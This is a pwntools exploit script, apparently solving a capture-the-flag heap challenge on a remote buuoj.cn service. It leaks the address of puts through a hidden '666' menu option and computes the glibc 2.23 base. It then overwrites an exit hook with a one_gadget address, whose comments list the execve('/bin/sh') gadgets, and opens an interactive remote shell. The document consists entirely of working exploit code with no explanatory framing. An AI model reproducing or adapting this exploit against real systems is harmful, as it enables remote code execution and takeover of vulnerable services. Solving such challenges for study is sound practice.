from pwn import *

libc = ELF("./libc-2.23.so")

io = remote("node4.buuoj.cn", 27687)

def add(length, name):
    io.recvuntil("Your choice->")
    io.sendline("1")
    io.recvuntil("Input string Length:")
    io.sendline(str(length))
    io.recvuntil("Author name:")
    io.send(name)


def edit(name, content):
    io.recvuntil("Your choice->")
    io.sendline("2")
    io.recvuntil("New Author name:")
    io.sendline(name)
    io.recvuntil("New contents:")
    io.send(content)


def show():
    io.recvuntil("Your choice->")
    io.sendline("2")


io.recvuntil("Your choice->")
io.sendline("666")
io.recvline()

addr = io.recvuntil("\n")[:-1]
addr = int(addr, 16)
print(hex(addr))

base = addr - libc.symbols["puts"]
exit_hook = base + 0x5f0040 + 3848
print(hex(exit_hook))
add(0x20,'a'*8+p64(exit_hook))

'''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
gadget = base + one_gadget[3]

edit("melody", p64(gadget))

io.sendline("s")


# gdb.attach(io)
# raw_input()

io.interactive()